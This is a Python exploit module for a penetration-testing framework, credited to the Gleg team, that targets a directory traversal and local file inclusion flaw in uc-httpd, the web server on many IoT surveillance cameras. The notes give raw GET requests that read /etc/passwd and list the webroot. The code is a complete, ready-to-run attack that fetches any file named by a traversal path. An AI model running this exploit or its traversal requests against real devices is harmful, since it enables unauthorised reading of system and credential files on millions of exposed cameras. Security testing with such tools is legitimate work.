#!/usr/bin/env python

import urllib2
import httplib
import sys
httplib.HTTPConnection._http_vsn = 10
httplib.HTTPConnection._http_vsm_str = 'HTTP/1.0'
from collections import OrderedDict
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_uc_httpd_directory_traversal"
INFO['DESCRIPTION'] = "uc-httpd Daemon Directory Traversal/LFI"
INFO['VENDOR'] = ""
INFO["CVE Name"] = ""
INFO["DOWNLOAD_LINK"] = ""
INFO["LINKS"] = []
INFO['CHANGELOG']="03 Apr, 2017. Written by Gleg team."
INFO['PATH'] = "General/"
INFO["NOTES"] = """
    uc-httpd is a HTTP daemon used by a wide array of IoT devices (primarily security cameras) which is vulnerable
to local file inclusion and directory traversal bugs. There are a few million total vulnerable devices, with
around one million vulnerable surviellence cameras.

The following request can be made to display the contents of the 'passwd' file:
GET ../../../../../etc/passwd HTTP/1.0

To display a directory listing, the following request can be made:
GET ../../../../../var/www/html/ HTTP/1.0
The above request would output the contents of the webroot directory as if 'ls' command was executed
    """

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.2"
OPTIONS["PORT"] = 8000
OPTIONS["FILENAME"] = '../../../../../etc/passwd'


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.filename = self.args.get("FILENAME", OPTIONS["FILENAME"])

    def make_req(self, path=''):
        url = 'http://%s:%s/%s' % (self.host, self.port, path)
        res = urllib2.urlopen(url).read()
        return res

    def run(self):
        #Get options from gui
        self.args()
        self.log('[*] Connecting to %s:%s' % (self.host, self.port))
        self.make_req()
        self.log('[*] Getting contents of %s' % self.filename)
        res = self.make_req(self.filename)
        self.log(res)
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
